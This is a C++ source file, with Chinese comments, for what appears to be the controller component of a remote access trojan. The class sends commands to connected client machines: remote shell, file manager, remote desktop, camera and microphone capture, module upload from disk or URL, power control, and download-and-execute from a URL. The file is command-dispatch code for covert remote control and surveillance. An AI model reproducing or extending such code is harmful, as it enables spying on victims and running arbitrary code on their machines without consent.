#include "stdafx.h"
#include "KernelSrv.h"
#include "ClientList.h"


CKernelSrv::CKernelSrv(HWND hClientList, DWORD Identity) :
CEventHandler(Identity)
{
	m_hClientList = hClientList;
}


CKernelSrv::~CKernelSrv()
{
}

void CKernelSrv::OnClose()
{
	//客户退出,通知移除
	SendMessage(m_hClientList, WM_CLIENT_LOGOUT, (WPARAM)this, 0);
}
void CKernelSrv::OnConnect()
{
	//一切工作准备就绪.可以开始接收了
	Send(KNEL_READY, 0, 0);
}
//.

void CKernelSrv::OnReadComplete(WORD Event, DWORD Total, DWORD nRead, char*Buffer)
{
	switch (Event)
	{
	case KNEL_LOGIN:
		SendMessage(m_hClientList, WM_CLIENT_LOGIN, (WPARAM)this, (LPARAM)Buffer);
		break;
	case KNEL_EDITCOMMENT_OK:
		SendMessage(m_hClientList, WM_CLIENT_EDITCOMMENT, (WPARAM)this, (LPARAM)Buffer);
		break;

	case KNEL_MODULE_NOT_FOUND:
		OnNotFountModule(Buffer);
		break;
	default:
		break;
	}
}



void CKernelSrv::Power_Reboot()
{
	Send(KNEL_POWER_REBOOT, 0, 0);
}
void CKernelSrv::Power_Shutdown()
{
	Send(KNEL_POWER_SHUTDOWN, 0, 0);
}
void CKernelSrv::EditComment(WCHAR*Comment)
{
	Send(KNEL_EDITCOMMENT, (char*)Comment,sizeof(WCHAR)*( wcslen(Comment) + 1));
}

void CKernelSrv::Restart()
{
	Send(KNEL_RESTART, 0, 0);
}

void CKernelSrv::UploadModuleFromDisk(WCHAR* Path)
{
	Send(KNEL_UPLOAD_MODULE_FROMDISK, (char*)Path, sizeof(WCHAR)*(wcslen(Path) + 1));
}

void CKernelSrv::UploadModuleFromUrl(WCHAR* Url)
{
	Send(KNEL_UPLOAD_MODULE_FORMURL, (char*)Url,  sizeof(WCHAR)*(wcslen(Url) + 1));
}
void CKernelSrv::BeginCmd()
{
	Send(KNEL_CMD, 0, 0);
}
void CKernelSrv::BeginChat()
{
	Send(KNEL_CHAT, 0, 0);
}
void CKernelSrv::OnNotFountModule(char*szBuffer)
{
	//没有找到模块,提示一下.
	MessageBox(NULL, (WCHAR*)szBuffer, L"Error", MB_OK);
}
void CKernelSrv::BeginFileMgr()
{
	Send(KNEL_FILEMGR, 0, 0);
}

void CKernelSrv::BeginRemoteDesktop()
{
	Send(KNEL_DESKTOP, 0, 0);
}

void CKernelSrv::BeginCamera()
{
	Send(KNEL_CAMERA, 0, 0);
}

void CKernelSrv::BeginMicrophone()
{
	Send(KNEL_MICROPHONE, 0, 0);
}

void CKernelSrv::BeginDownloadAndExec(WCHAR szUrl[])
{
	Send(KNEL_DOWNANDEXEC, (char*)szUrl, (sizeof(WCHAR)*(wcslen(szUrl) + 1)));
}